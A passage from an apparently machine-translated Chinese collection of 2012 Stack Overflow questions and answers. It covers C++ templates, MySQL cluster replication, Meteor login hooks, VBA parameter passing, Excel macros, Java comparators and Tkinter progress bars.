        bool TryDequeue(QSharedPointer<Data>& value, unsigned long time = ULONG_MAX);
    };
}
#endif //BLOCKING_QUEUE_H 
```

实现有点长，所以我有一个馅饼：http: [//pastie.org/5368660](http://pastie.org/5368660)

程序入口点如下所示：

```
#include <QtCore/QCoreApplication>
#include <QTimer>
#include <iostream>
#include "BlockingQueue.h"

using namespace std;
using namespace TestingNS;

class Item
{

};

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);

    BlockingQueue<Item> queue;

    cout << "Press any key to exit!" << endl;

    char in;
    cin.get(in);
    QTimer::singleShot(0, &a, SLOT(quit()));

    return a.exec();
} 
```

我得到的链接器错误是：

```
Error   1   error LNK2019: unresolved external symbol "public: __thiscall TestingNS::BlockingQueue<class Item>::BlockingQueue<class Item>(void)" (??0?$BlockingQueue@VItem@@@TestingNS@@QAE@XZ) referenced in function _main 
```

我不明白为什么链接器找不到构造函数（也找不到任何其他方法`BlockingQueue`）。有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T23:06:31.617

是的`template`，你必须把实现放在 BlockingQueue.h

有一段时间，该标准确实提供了`export`允许这样一个单独的实现文件的关键字。但没有多少供应商实施它。C++11 停止使用 export 但保留`export` 关键字以备将来使用。）

模板必须与对特定模板实例化的请求结合使用。

# mysql - 表更新的 MySQL 集群问题

> ID：13353056
> 
> 赞同：1
> 
> 时间：2012-11-12T23:03:21.703
> 
> 标签：mysql, replication, cluster-computing

我有两个 MySQL 集群设置用于复制。我的设置如下：

CLUSTER A db001 - 管理/SQL 节点（复制主节点） db002 - 管理/SQL 节点 db003 - 存储节点 db004 - 存储节点

CLUSTER B db005 - 管理/SQL 节点（复制从属） db006 - 管理/SQL 节点 db007 - 存储节点 db008 - 存储节点

每个集群中的一切都运行良好，并且创建数据库/表正在复制集群之间没有问题。如果我更新 db001 或 db005 上的表，它们会在集群之间复制，我可以在四个 SQL 节点中的任何一个上看到更改。

但是，如果我使用 db002 或 db006 更新表，则更改只会出现在集群中的其他 SQL 节点上——它们不会复制到其他集群。为了在任一集群中的任一 SQL 节点上进行更改以进行复制，我是否遗漏了什么？

先感谢您！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T18:31:27.573

大师，顾名思义，就是做这项工作。根据定义，奴隶只做他们被告知的事情。

你需要[主主复制](http://dev.mysql.com/doc/refman/5.1/en/mysql-cluster-replication-multi-master.html)。

# netbeans - 如何在 NetBeans 平台中将 TopComponent 窗口定位到资源管理器的输出和底部

> ID：13353059
> 
> 赞同：0
> 
> 时间：2012-11-12T23:03:52.697
> 
> 标签：netbeans, netbeans-platform

我有一个 netbeans 平台应用程序，我的输出窗口在编辑器位置打开，每次重新安装程序时，我都必须手动将其重新定位到底部区域。此外，我还有另一个 TopComponent，我想从左侧“资源管理器”区域的底部开始，该区域应该已经预定义。有没有办法做到这一点？

仅供参考 - 我在 Ubuntu 12.04 上运行，所以不确定这是否是我看到这种行为的原因。

任何建议都非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-22T10:14:22.950

When you have open TopComponent wizard, you can set "window position" or you can "redefine..." modes for TopComponents.

```
//yourMode for exaple Editor or new mode, that was redefined by you
@TopComponent.Registration(mode = "yourMode", openAtStartup = false) 
```

# google-analytics - 将数据从 Google Tag Manager 传递到 Google Analytics

> ID：13353065
> 
> 赞同：3
> 
> 时间：2012-11-12T23:04:17.687
> 
> 标签：google-analytics, google-tag-manager

我的帐户中有两个 Google Analytics（分析）个人资料。一，对于我的生产帐户，属性 ID：UA-XXXXXXXX-1。我的第二个配置文件用于测试我的暂存帐户，它的属性 ID：UA_XXXXXXXX-2。

在标签管理器中，如果我的 url 包含“mydomain.com”，我的“-1”标签会触发，如果 url 包含“mydomain.it”，我的“-2”标签会触发。

使用此设置触发 GA 标签可以正常工作。我的暂存数据与生产数据分开，并且能够测试基本的 GA 网页浏览量。

现在需要的是分离事件的能力。目前，我在每个事件跟踪之前调用 setAccount（我知道这可以在单个调用中）。

```
_gaq.push(['_setAccount', 'UA-XXXXXXXX-1']);
_gaq.push(['_trackEvent', 'Videos', 'Play', 'Gone With the Wind']); 
```

我想要做的是调用 _setAccount 方法并从 Google 跟踪代码管理器中动态传递值，我在其中根据 url 设置属性 ID。

有没有办法做这样的事情（或更好的事情），以便我可以根据跟踪代码管理器规则设置帐户？

```
_gaq.push(['_setAccount', [Tag Manager Property ID] ]); 
```

感谢您提供的任何建议/帮助。

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T08:22:50.537

IMO 将数据从标签管理器传递到网站，除了所有实际困难之外，将完全违背异步加载代码的目的。

您将方法“推送”到堆栈上，以便在将来某个未确定的时间点加载代码时处理它们。如果您想从代码中获取帐户 ID，则必须等到它被加载，因此您将失去异步加载的所有优势。

据我所知（尚未广泛使用标签管理器）正确的方法是将事件数据推送到“数据层”变量：

```
dataLayer.push({'myevent': 'mylabel'}); 
```

并在通过标签管理器部署的代码中使用变量（如 dataLayer.myevent）（因此您可以在域特定代码中进行实际事件跟踪）。

这在以下位置进行了描述：[https ://developers.google.com/tag-manager/devguide](https://developers.google.com/tag-manager/devguide)

标签管理器中实际上有一个用于 Google Analytics 的事件跟踪模板。对于事件值，您可以创建一个新宏并将其设置为 dataLayer 变量。然后添加您的域特定规则，您应该一切就绪。

# jquery - 如何实现增量代码以顺序更新我的选择器类

> ID：13353069
> 
> 赞同：1
> 
> 时间：2012-11-12T23:04:26.370
> 
> 标签：jquery, jquery-selectors, slider

我有一个从头开始构建的 jquery 内容滑块，带有“上一个”和“下一个”按钮和分页。

如何实现增量代码，以便每次单击“下一步”时，选择器元素类的类更改为 .no2、.no3 等，然后在到达 .no7 后再次开始循环？

我显然希望上一个按钮反向实现相同的效果。

（视觉上发生的事情是 dot.png 在您单击“下一步”按钮时沿时间线移动，从而产生分页效果）

```
.no1{
    background:url(../images/slide6/dot.png), url(../images/slide6/timeline.png);background-position:8px 53px,left bottom; background-repeat:no-repeat;"}

.no2{
background:url(../images/slide6/dot.png), url(../images/slide6/timeline.png);background-position:81px 53px,left bottom ; background-repeat:no-repeat;"}

.no3{
background:url(../images/slide6/dot.png), url(../images/slide6/timeline.png);background-position:154px 53px,left bottom ; background-repeat:no-repeat;"}

.no4{
background:url(../images/slide6/dot.png), url(../images/slide6/timeline.png);background-position:227px 53px,left bottom ; background-repeat:no-repeat;"}

.no5{
background:url(../images/slide6/dot.png), url(../images/slide6/timeline.png);background-position:300px 53px,left bottom ; background-repeat:no-repeat;"}

.no6{
background:url(../images/slide6/dot.png), url(../images/slide6/timeline.png);background-position:373px 53px,left bottom ; background-repeat:no-repeat;"}

.no7{
background:url(../images/slide6/dot.png), url(../images/slide6/timeline.png);background-position:446px 53px,left bottom ; background-repeat:no-repeat;"} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T23:14:49.500

If`noN`是该元素上唯一的类，它更简单：

```
$('.next').click(function() {
  var $el = $('#someElement'),  
      elClass = $el.attr('class'),
      parts = elClass.match(/(no)([1-7])/);
  if (parts[2] === '7') {
    parts[2] = 1;
  }
  else {
    parts[2]++;
  }
  $el.removeClass(elClass).addClass(parts[1] + parts[2]);
}); 
```

这里`.next`指的是`next`你的那个按钮，和`#someElement`- 你想要循环的元素类。

# java - Jfree：如何制作带有小时周期的 CandleStick 图表

> ID：13353070
> 
> 赞同：2
> 
> 时间：2012-11-12T23:04:31.903
> 
> 标签：java, android, jfreechart

我想制作每小时周期的蜡烛图（android），并寻找 afreeChart 库以供使用。基于 jfreeCharts 的 Afreechart。

我有一个带有每日周期的烛台示例：

公共静态 OHLCDataset createDataset1() {

```
 Date[] date = new Date[47];
    double[] high = new double[47];
    double[] low = new double[47];
    double[] open = new double[47];
    double[] close = new double[47];
    double[] volume = new double[47];

    int jan = 1;
    int feb = 2;

    for(int i = 0; i < 47; i++) {
        if(i <= 27) {
            date[i] = createDate(2001, jan, i+4, 12, 0);
        } else {
            date[i] = createDate(2001, feb, i-27, 12, 0);
        }
        high[i] = 45 + Math.random() * 20;
        low[i] = high[i] - (Math.random() * 30 + 3);
        do {
            open[i] = high[i] - Math.random() * (high[i] - low[i]);
            close[i] = low[i] + Math.random() * (high[i] - low[i]);
        } while(Math.abs(open[i] - close[i]) < 1);
    }

    return new DefaultHighLowDataset("Series 1", date, high, low, open, close, volume);
}

private static final Calendar calendar = Calendar.getInstance();

/**
 * Returns a date using the default locale and timezone.
 * @param y the year (YYYY).
 * @param m the month (1-12).
 * @param d the day of the month.
 * @param hour the hour of the day.
 * @param min the minute of the hour.
 * @return A date.
 */
private static Date createDate(int y, int m, int d, int hour, int min) {
    calendar.clear();
    calendar.set(y, m - 1, d, hour, min);
    return calendar.getTime();
} 
```

DefaultHighLowDataset 不适用于非日期值。我在开发人员指南 Jfreechart 中查看 OHLC 类，但没有找到按小时计算的方法。如何每小时创建一根蜡烛，而不是每个日期期间一根蜡烛？也许有人有例子？谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T17:53:23.577

在 的实现中[`OHLCDataset`](http://www.jfree.org/jfreechart/api/javadoc/org/jfree/data/xy/OHLCDataset.html)，`OHLCSeriesCollection`包括`addSeries(OHLCSeries series)`. An`OHLCSeries`允许`add(RegularTimePeriod period, …)`并`RegularTimePeriod`包含子类`Hour`。[这里](https://stackoverflow.com/q/7999587/230513)`Hour`讨论了一个使用示例。

# function - 在 MS Access 中使用 VB 的变量范围

> ID：13353071
> 
> 赞同：1
> 
> 时间：2012-11-12T23:04:33.720
> 
> 标签：function, ms-access, scope, vba

我没有太多使用 VB，但据我所知，范围与 C# 中的工作方式相同。问题是，我在 MS Access 中使用 VB，所以我不确定规则是否有点不同（尽管我认为它们不是）。以下代码显示了分配给仅在函数参数中声明的变量的值。特别是查看 PurchaseOrderID，我不确定它是如何保留其分配的值以便在执行它的函数中使用的。

```
Function Create(SupplierID As Long, EmployeeID As Long, OrderID As Long, PurchaseOrderID As Long) As Boolean
    Dim rsw As New RecordsetWrapper
    If rsw.OpenRecordset("Purchase Orders") Then
        With rsw.Recordset
            .AddNew
            ![Supplier ID] = SupplierID
            If EmployeeID > 0 Then
                ![Created By] = EmployeeID
                ![Creation Date] = Now()
                ![Submitted By] = EmployeeID
                ![Submitted Date] = Now()
                ![Status ID] = Submitted_PurchaseOrder
            End If

            If OrderID > 0 Then
                ![Notes] = InsertString(PurchaseGeneratedBasedOnOrder, CStr(OrderID))
            End If
            If rsw.Update Then
                .Bookmark = .LastModified
                PurchaseOrderID = ![Purchase Order ID]
                Create = True
            End If
        End With
    End If
End Function

Function CreateLineItem(PurchaseOrderID As Long, ProductID As Long, UnitCost As Long, Quantity As Long) As Boolean
    Dim rsw As New RecordsetWrapper
    If rsw.OpenRecordset("Purchase Order Details") Then
        With rsw.Recordset
            .AddNew
            ![Purchase Order ID] = PurchaseOrderID
            ![Product ID] = ProductID
            ![Quantity] = Quantity
            ![Unit Cost] = UnitCost
            CreateLineItem = rsw.Update
        End With
    End If
End Function 
```

有人可以给我一些见解吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T00:37:19.690

在 VBA 中，如何调用过程可能很重要。

> “即使被调用的过程已将其参数声明为 ByRef，您也可以通过将每个参数括在括号中来强制它们为 ByVal。”

-- [http://www.cpearson.com/excel/byrefbyval.aspx](http://www.cpearson.com/excel/byrefbyval.aspx)

所有 Office 应用程序中的 VBA 都是如此。例如，假设您有两个过程：

```
Sub SubByVal(ByVal Total As Integer)
    Total = 50
End Sub

Sub SubByRef(ByRef Total As Integer)
    Total = 50
End Sub 
```

然后你运行了一些测试：

```
Dim Total As Integer
Total = 100 
```

这三个版本按预期工作，总计等于 100

```
Call SubByVal(Total)
SubByVal (Total)
SubByVal Total 
```

这两个按预期工作，总计等于 50

```
Call SubByRef(Total)
SubByRef Total 
```

然而，在这个版本中，尽管调用了 ByRef，Total 还是等于 100，因为它被括号强制为 ByVal。

```
SubByRef (Total) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-15T22:05:26.553

也许这最好由类型来处理。像这样的东西：

```
Type PurchaseSet
   PurchaseOrderID As Long
   OrderCreated as boolean
End Type

Function Create(SupplierID As Long, EmployeeID As Long, OrderID As Long ) As PurchaseSet
    Dim rsw As New RecordsetWrapper
    Dim ps as PurchaseSet 
   ps.OrderCreated = false

    If rsw.OpenRecordset("Purchase Orders") Then
        With rsw.Recordset
            .AddNew
            ![Supplier ID] = SupplierID
            If EmployeeID > 0 Then
                ![Created By] = EmployeeID
                ![Creation Date] = Now()
                ![Submitted By] = EmployeeID
                ![Submitted Date] = Now()
                ![Status ID] = Submitted_PurchaseOrder
            End If

            If OrderID > 0 Then
                ![Notes] = InsertString(PurchaseGeneratedBasedOnOrder, CStr(OrderID))
            End If
            If rsw.Update Then
                .Bookmark = .LastModified
                ps.PurchaseOrderID = ![Purchase Order ID]
                ps.OrderCreated = True

            End If
        End With
    End If

    Create = ps
End Function 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-12T23:15:52.353

您可以按值或按引用将参数传递给 VBA 过程。如果您既没有指定，也没有`ByVal`在`ByRef`过程的声明中指定，则默认为`ByRef`. 所以以下两个声明是等价的......

```
Function DoSomething(PurchaseOrderID As Long) AS Boolean
Function DoSomething(ByRef PurchaseOrderID As Long) AS Boolean 
```

这里的关键是`ByRef`允许将过程中参数的更改传输回调用者。

# ajax - Shopify Ajax API 调用是否计入限制？

> ID：13353072
> 
> 赞同：0
> 
> 时间：2012-11-12T23:04:51.247
> 
> 标签：ajax, api, shopify

我想我会问 API 使用的 Shopify 调用限制是否也包括 Ajax API 调用？

我的应用程序的后端 API 要求相当轻，但确实有一些相当活跃的前端调用。怀疑除非商店有大量同时访问者，否则我会突破限制，但无论哪种方式对我来说都会有好处。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T16:21:52.697

根据[Shopify 支持论坛](http://ecommerce.shopify.com/c/ecommerce-design/t/ajax-api-call-limit-48658)，通过 Ajax API 的 API 调用没有限制：

> 每个商店每 10 分钟的 Ajax 调用没有限制。像 HTTP 请求这样的 Ajax 请求在 Shopify 中没有限制：您的商店可以处理任何流量。更多的流量意味着更多的 HTTP 请求，也可能——如果你使用 Ajax——更多的 Ajax 请求。都很好。来吧。

# meteor - 如何在使用 Meteor 的登录过程中挂钩身份验证回调？

> ID：13353075
> 
> 赞同：1
> 
> 时间：2012-11-12T23:04:52.100
> 
> 标签：meteor

使用流星，我希望能够`user`在他们使用外部服务登录（经过身份验证）以获得他们的授权声明后增加记录。

**更新** 我正在使用`{{loginButtons}}`车把助手小部件。

目前，我看到一个`Accounts.validateNewUser`和一个`Accounts.onCreateUser`可以在创建新用户期间挂钩。这些最初会有所帮助，但我的需求是经常性的。

我知道有一个`allow`功能可以`Meteor.Collection`作为授权用户访问集合的一种方式——这正是`claims`我打算用来增加用户来确定授权的地方。

有谁知道登录过程中有一个钩子可以让我这样做吗？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-11-13T23:36:28.630

解决缺少回调的最简单方法是使用相关的反应变量：

```
Tracker.autorun(function() {
  if (Meteor.userId()) {
    // do something when they've just logged in.
  }
}); 
```

上下文设置`autorun`将仅在值更改时重新运行`Meteor.userId()`- 即当他们登录时。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2014-03-19T11:32:41.267

从 Meteor 0.7.2 版本开始，有一个服务器端可用的钩子： [Accounts.onLogin()](http://docs.meteor.com/#accounts_onlogin)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T13:08:15.167

从 Meteor docs on [login with password](http://docs.meteor.com/#meteor_loginwithpassword)看来，您需要做的事情似乎已经有一个回调：

```
Meteor.loginWithPassword(user, password, [callback]) 
```

> **回调**函数可选回调。调用成功时不带参数，或失败时使用单个 Error 参数。

[Meteor 和外部身份验证服务](http://docs.meteor.com/#meteor_loginwithexternalservice)都支持登录回调。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-13T18:41:00.073

@Makita，谢谢你的回答。我确实看到了那个`callback`参数，但我在问题中没有提到的是我没有低级挂钩，因为我正在使用`{{loginButtons}}`车把助手来注入用户管理小部件（这太棒了）。

这种方法的问题是在身份验证发生后我无法访问回调，所以我创建了这个拉取请求，我希望将其合并以解决问题：

[https://github.com/meteor/meteor/pull/479](https://github.com/meteor/meteor/pull/479)

有了这个，你应该可以调用：

```
Accounts.ui.config({
    onSuccess: function (err) {
        //perform addl authorization on Meteor.user() here
    }
}); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-11-29T06:52:22.800

对于 2014 年来这里的人，您可以使用[onLogin 回调](http://docs.meteor.com/#/full/accounts_onlogin)服务器端

Accounts.onLogin((obj)-> user = ob.user )

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-06-15T18:11:54.783

对于接受的答案，页面重新加载存在一个问题，该问题使该解决方案变得混乱。我最终做了这样的事情（它使用角流星，但你应该明白要点，只需用自动运行代替跟踪器）

```
.run(function($meteor,$rootScope,$state,$localstorage){
$meteor.autorun($rootScope, function(){
    var id = Meteor.userId();
    if(id == undefined || id == null){
        id = '';
    }
    if($localstorage.get('user_id','') != id){
        $localstorage.set('user_id',id);
        if(Meteor.userId()){
            //On login
            $state.go('profile',{user_id: Meteor.userId()});
        }else{
            //On logout
            $state.go('main');
        }
    }
});
}); 
```

我只推荐这个解决方案进行开发，当我停止使用默认帐户-ui 时，我将不得不实现较低级别的功能，并且不需要这个。

# html - 一个输入字段，多个名称

> ID：13353076
> 
> 赞同：3
> 
> 时间：2012-11-12T23:04:57.347
> 
> 标签：html, forms

在 HTML 表单中，如何从一个输入字段中获取两个名称？是否可以通过隐藏的输入字段？如何？我试图使隐藏字段值动态等于非隐藏值（这样无论用户写什么它们都将相等），但我确信它不起作用，而不是这样的事情是否会工作。[这里](http://www.webdeveloper.com/forum/showthread.php?257221-HTML-input-with-multiple-names-functions)有人建议类似的事情应该是可能的。我的问题应该出在 value 属性中——我尝试了不同的值，但我没有设法将它绑定到 foo 值。

```
<input name="foo" id="foo" type="text" value="foobar" />
<input type="hidden" name="bar" id="bar" value=foo /> 
```

我宁愿在没有 Java Script 的情况下解决它。

我想将这两个属性用于不同的网站，它们对相同的属性使用不同的名称（我们的目的相同，作用略有不同，但格式和值是相同的）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T05:55:36.083

没有 JavaScript 是不可能的。就 HTML 而言，隐藏的输入字段只是静态数据；它们不受用户输入的任何影响。同样，当用户输入更改字段的值时，HTML 中无法指定这也会更改另一个字段。

声明“我想为不同的网站使用这两个属性，它们对同一属性使用不同的名称”似乎暗示表单数据将根据某些内容提交到两个或多个服务器之一。尽管如果使用某些 HTML5 功能，如果没有 JavaScript，这在技术上是可行的，但它们的浏览器支持是有限的。可行的选项是：1) 使用不同的表单，2) 使用 JavaScript，3) 使用简单的服务器端调解器，根据数据中的某些字段将数据转发到一个或多个服务器端处理程序。

# excel - EXCEL：合并多行宏

> ID：13353080
> 
> 赞同：2
> 
> 时间：2012-11-12T23:05:15.513
> 
> 标签：excel, vba

我需要一个 MACRO 来查看 COL A 的所有实例并将 COL B 的所有值合并到一行中，同时删除过程中的重复项。添加逗号是一个加号。

我不知道任何VBA，但如果有人好心解释，我很想学习。这不是我需要的第一个 VBA 解决方案。谢谢！

我需要的示例：

```
COL A    COL B 
100 ---- PC 245
100 ---- PC 246
100 ---- PC 247
101 ---- PC 245
101 ---- PC 246
101 ---- PC 247 
```

**进入**

```
COL A    COL B 
100 ---- PC 245, PC 246, PC 247
101 ---- PC 245, PC 246, PC 247 
```

该数据将进入地图，因此我需要将其连接到工具提示文本中。任何帮助表示赞赏。谢谢！

***PS：我需要的是一个宏。我不需要的是数据透视表。***

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T17:26:17.393

重新发布此代码，因为它已被版主删除。@bill-the-lizard，在重新删除之前，您能评论一下我的回答有什么问题吗？

```
Sub ConsolidateRows()
'takes rows and consolidate one or many cells, based on one or many cells matching with above or below rows.

Dim lastRow As Long, i As Long, j As Long
Dim colMatch As Variant, colConcat As Variant

'**********PARAMETERS TO UPDATE****************
Const strMatch As String = "A"    'columns that need to match for consolidation, separated by commas
Const strConcat As String = "B"     'columns that need consolidating, separated by commas
Const strSep As String = ", "     'string that will separate the consolidated values
'*************END PARAMETERS*******************

application.ScreenUpdating = False 'disable ScreenUpdating to avoid screen flashes

colMatch = Split(strMatch, ",")
colConcat = Split(strConcat, ",")

lastRow = range("A" & Rows.Count).End(xlUp).Row 'get last row

For i = lastRow To 2 Step -1 'loop from last Row to one

    For j = 0 To UBound(colMatch)
        If Cells(i, colMatch(j)) <> Cells(i - 1, colMatch(j)) Then GoTo nxti
    Next

    For j = 0 To UBound(colConcat)
        Cells(i - 1, colConcat(j)) = Cells(i - 1, colConcat(j)) & strSep & Cells(i, colConcat(j))
    Next

    Rows(i).Delete

nxti:
Next

application.ScreenUpdating = True 'reenable ScreenUpdating
End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T05:10:04.093

以下代码要求您添加对“Microsoft Scripting Runtime”的引用。

```
VBA Editor->Tools->References, Find and select Microsoft Scripting Runtime 
```

它可以使用“集合”而不是“字典”。我只是更喜欢字典。

代码将读取活动工作表（“Do Loop”）并复制数据（删除过程中的重复项）

然后它会清除工作表上的**所有**数据。

然后它遍历收集的数据并将其输出到现在为空的工作表（“For Each”循环）

```
Sub Cat()
Dim Data As Dictionary
Dim Sheet As Worksheet

Set Sheet = ThisWorkbook.ActiveSheet
Set Data = New Dictionary

Dim Row As Integer
Dim Key As Variant
Dim Keys() As Variant
Dim Value As Variant
Dim Values() As Variant
Dim List As String

Row = 1

Do
    If Data.Exists(CStr(Sheet.Cells(Row, 1))) Then
        If Not Data(CStr(Sheet.Cells(Row, 1))).Exists(CStr(Sheet.Cells(Row, 2))) Then
            Data(CStr(Sheet.Cells(Row, 1))).Add (CStr(Sheet.Cells(Row, 2))), True
        End If
    Else
        Data.Add CStr(Sheet.Cells(Row, 1)), New Dictionary
        Data(CStr(Sheet.Cells(Row, 1))).Add (CStr(Sheet.Cells(Row, 2))), True
    End If
    Row = Row + 1
    If IsEmpty(Sheet.Cells(Row, 1)) Then
        Exit Do
    End If
Loop

Sheet.Cells.ClearContents

Keys = Data.Keys
Row = 1

For Each Key In Keys
    Values = Data(Key).Keys
    Sheet.Cells(Row, 1) = Key
    List = ""
    For Each Value In Values
        If List = "" Then
            List = Value
        Else
            List = List & ", " & Value
        End If
    Next Value
    Sheet.Cells(Row, 2) = List
    Row = Row + 1
Next Key

End Sub 
```

# ruby-on-rails - 从另一个模型中将数据保存到数据库中是一种好习惯吗？在 Rails 中？

> ID：13353081
> 
> 赞同：0
> 
> 时间：2012-11-12T23:05:17.033
> 
> 标签：ruby-on-rails

我有`articles`一张`notifications`桌子。每当一篇文章成功保存在数据库中时，我都会从模型中向用户发送一条关于它的通知。

我的问题是...

MVC 设计是否允许这样做，或者我应该使用控制器来完成我正在做的事情。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T23:07:54.517

当然，您可能*不*应该为此使用控制器，*除非*它完全由请求触发或依赖于请求参数。在大多数情况下，这是属于模型层的业务逻辑。

或者，如果您想保持保存文章和通知用户的操作彼此分离，您可以查看[观察者。](http://api.rubyonrails.org/classes/ActiveRecord/Observer.html)

# php - 通过 SMTP 发送 PHP 电子邮件：什么是 HELO，如何设置以避免成为垃圾邮件

> ID：13353082
> 
> 赞同：1
> 
> 时间：2012-11-12T23:05:23.587
> 
> 标签：php, email, smtp, phpmailer, spam

在一个拥有大约 1300 名用户的网站上，我设置了用于确认您的电子邮件地址等的电子邮件通过 gmail 帐户（google smtp）通过 phpmailer 发送，这在前 2 个月运行良好。

现在，最近越来越多的用户抱怨他们不再收到任何电子邮件，甚至在垃圾邮件文件夹中也没有。

虽然我自己尝试时收到任何问题都没有问题，但我发现它特别涉及某些提供商（或者说各种各样的提供商，而不是 gmail 本身）。

然后我发现这篇文章：[php mail() Goes to spam but when sent through SMTP Server it works fine?](https://stackoverflow.com/questions/8525724/php-mail-goes-to-spam-but-when-sent-via-smtp-server-it-works-fine)

我不太明白 Gryphius（公认的答案）在说什么。我已经阅读了关于避免垃圾邮件的 Google 指南（不记得它们的确切名称），关于 HELO 和 A 记录，但不知道它们是什么。谁能解释一下它是什么以及如何做到这一点？

还可以做些什么来从共享主机发送电子邮件并确保它们最能到达收件人？

非常感谢您的帮助！

更新：我在标题中找到的这些信息，你能从中看出什么？

> X-Acl-Warn：X-DNSBL-JUNKEMAILFILTER
> X-Spam-Score：-0.3

# java - 带外部参数的 PriorityQueue

> ID：13353085
> 
> 赞同：2
> 
> 时间：2012-11-12T23:05:35.343
> 
> 标签：java

我有一个项目，其中有一个 Halfedge 类（olny .class 文件，所以无法修改它）。我想创建一个优先队列。为了确定哪个元素更大，我不仅需要 Halfedge 类中的字段，还需要我在代码中创建的 HashMap。

问题是：当我为 Halfedge 定义特定的 Comparator 类时，我不能包含任何参数。

我的问题是：如何使用外部参数为我的 Halfedge 类实现比较器类？（或者简单地说，我应该如何构造那个 PriorityQueue）

非常感谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T23:10:19.467

请看下面的代码：

```
public class HalfedgeComparator
        implements Comparator<Halfedge>;
{

  Object param1 = null;

  public HalfedgeComparator (Object param1) {
    this.param1= param1;
  }

  public int compare(Halfedge item1, Halfedge item2)
  {
    return ...;
     //your logic here where you can use the param1 passed in the constructor
  }
} 
```

客户端代码可能是：

```
Collections.sort(yourListHere, new HalfedgeComparator(yourExternalParamHere)); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-11-12T23:17:14.957

请注意，您可以`final`从匿名内部类访问变量，并且可以根据需要使用它。

这是一个简单的例子：

```
public static void main(String args[]) {
    final Map<String,Integer> map = new HashMap<>();
    String s1 = "a";
    String s2 = "b";
    String s3 = "c";
    map.put(s2, 1);
    map.put(s1, 2);
    map.put(s3, 3);
    PriorityQueue<String> pq = new PriorityQueue<>(3, new Comparator<String>() {

        @Override
        public int compare(String o1, String o2) {
            return map.get(o1).compareTo(map.get(o2));
        }
    });
    pq.add(s1);
    pq.add(s2);
    pq.add(s3);
    while (pq.isEmpty() == false) 
        System.out.println(pq.poll());
} 
```

请注意，该`Comparator`对象正在使用`map`局部变量。之所以可以这样做，是因为`map`声明了变量`final`。

* * *

`Map`另一种方法是在 的构造函数中传递对 的引用`Comparator`（如果它不是匿名内部类），将其存储为字段并稍后使用。

* * *

在任何情况下 - 您必须确保`Map`某个元素中的数据在元素插入后不会更改`PriorityQueue`- 如果发生这种情况 - 您的数据结构将被损坏并且您将获得未定义的行为。

# c# - 如何在 C# 中设置 DataGrid 单元格的值

> ID：13353088
> 
> 赞同：0
> 
> 时间：2012-11-12T23:05:54.437
> 
> 标签：c#, .net, wpf, datagrid, datagridtextcolumn

我正在.NET 4.5 框架中编写应用程序。我`DataGrid`用来显示数据。我想添加新的文本列，并在每一行中为该列中的单元格分配文本值。我不知道该怎么做。我不知道如何绑定数据，或者我可以手动更改单元格内容吗？这对我来说是最方便的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T00:16:16.230

这是以编程方式填充 DataGrid 的一种方法：

```
public class Row
{
    public int Id { get; set; }
    public string Name { get; set; }
}

MyDataGrid.Columns.Add(new DataGridTextColumn { Header = "Id", Binding = new Binding("Id"), Width = 100 });
MyDataGrid.Columns.Add(new DataGridTextColumn { Header = "Name", Binding = new Binding("Name"), Width = 100 });
MyDataGrid.Items.Add(new Row { Id = 1, Name = "Mr. Anderson"});
MyDataGrid.Items.Add(new Row { Id = 2, Name = "John Smith"}); 
```

# python - Python，Tkinter - ttk.Progressbar 在一个单独的线程中

> ID：13353090
> 
> 赞同：1
> 
> 时间：2012-11-12T23:05:59.027
> 
> 标签：python, multithreading, tkinter

我在这方面搜索了很多，但我仍然没有找到我要找的东西。这是一个经典的问题，我想，但我仍然无法弄清楚。

我有这个 Python/Tkinter 代码。该代码通过简单地使用`os.system(cmd)`. 我想要一个进度条（振荡的，而不是渐进的）向用户显示实际发生的事情。我想我只需要在调用之前启动包含进度条的线程`os.system`，然后`os.system`在进度条线程运行时调用，关闭进度条线程并销毁关联`Toplevel()`。

我的意思是，Python 非常灵活，是否可以不费力地做到这一点？我知道从另一个线程杀死一个线程是不安全的（由于数据共享），但是据我所知，这两个线程不共享任何数据。

能不能这样走：

```
progressbar_thread.start()
os.system(...)
progressbar_thread.kill() 
```

如果那不可能，我仍然不明白如何在两个线程之间传递“信号”变量。

谢谢，

安德烈亚

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-13T11:06:39.873

这是你追求的东西吗？

```
from Tkinter import *
import ttk, threading

class progress():
    def __init__(self, parent):
            toplevel = Toplevel(tk)
            self.progressbar = ttk.Progressbar(toplevel, orient = HORIZONTAL, mode = 'indeterminate')
            self.progressbar.pack()
            self.t = threading.Thread()
            self.t.__init__(target = self.progressbar.start, args = ())
            self.t.start()
            #if self.t.isAlive() == True:
             #       print 'worked'

    def end(self):
            if self.t.isAlive() == False:
                    self.progressbar.stop()
                    self.t.join()

def printmsg():
    print 'proof a new thread is running'

tk = Tk()
new = progress(tk)
but1 = ttk.Button(tk, text= 'stop', command= new.end)
but2 = ttk.Button(tk, text = 'test', command= printmsg)
but1.pack()
but2.pack()
tk.mainloop() 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T18:48:02.773

